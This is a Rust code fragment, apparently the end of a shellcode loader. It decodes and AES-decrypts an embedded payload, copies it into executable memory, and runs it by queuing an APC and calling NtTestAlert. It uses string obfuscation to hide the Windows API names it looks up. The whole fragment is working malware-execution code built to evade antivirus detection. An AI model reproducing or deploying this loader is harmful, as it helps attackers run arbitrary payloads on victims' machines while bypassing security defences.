


    let cipher = Cipher::new_128(&PASSWORD1);
    let shellcode = base64_decode(String::from(SHELLCODE));
    let shellcode = cipher.cbc_decrypt(PASSWORD2, &shellcode[..]);

    unsafe{
        let dllname:Vec<u16> = obfstr!("ntdll.dll\0").encode_utf16().collect();
        let fnname = b"NtTestAlert\0";
        let p = GetProcAddress(GetModuleHandleW(PCWSTR(dllname.as_ptr() as _)).unwrap(), PCSTR(fnname.as_ptr())).unwrap();
        let addr = VirtualAlloc(null(),shellcode.len(),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
        std::ptr::copy_nonoverlapping(shellcode.as_ptr() as _, addr, shellcode.len());
        let kernel32:Vec<u16> = obfstr!("Kernel32.dll\0").encode_utf16().collect();
        let queue_ueser_apc_name = b"QueueUserAPC\0";
        let queue_ueser_apc_fn = GetProcAddress(GetModuleHandleW(PCWSTR(kernel32.as_ptr() as _)).unwrap(), PCSTR(queue_ueser_apc_name.as_ptr())).unwrap();
        
        let queue_ueser_apc_fn:QueueUserAPC = std::mem::transmute(queue_ueser_apc_fn);
        queue_ueser_apc_fn(Some(std::mem::transmute(addr)),GetCurrentThread(),0);
        p();
    }
    
    
}

fn base64_decode(shellcode:String)->Vec<u8>{
    base64::decode_config(shellcode,base64::STANDARD_NO_PAD).unwrap()
}